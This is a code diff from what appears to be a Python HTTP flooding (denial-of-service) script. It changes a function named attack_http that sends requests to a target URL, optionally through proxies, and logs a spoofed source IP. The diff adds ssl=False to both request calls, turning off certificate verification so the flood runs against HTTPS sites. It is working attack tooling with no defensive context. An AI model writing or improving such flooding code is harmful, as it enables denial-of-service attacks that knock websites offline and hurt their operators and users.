@@ -80,10 +80,10 @@ async def attack_http(target_url, proxy=None):
         async with aiohttp.ClientSession(headers=headers) as session:
             if proxy:
                 proxy_url = f"http://{proxy}"
-                async with session.get(target_url, proxy=proxy_url, timeout=5) as response:
+                async with session.get(target_url, proxy=proxy_url, timeout=5, ssl=False) as response:
                     print(f"Request sent from {spoofed_ip} via proxy {proxy} to {target_url}, Response: {response.status}")
             else:
-                async with session.get(target_url, timeout=5) as response:
+                async with session.get(target_url, timeout=5, ssl=False) as response:
                     print(f"Direct request sent from {spoofed_ip} to {target_url}, Response: {response.status}")
     except Exception as e:
         print(f"Error sending request to {target_url} ({'Proxy: ' + proxy if proxy else 'Direct'}): {e}")
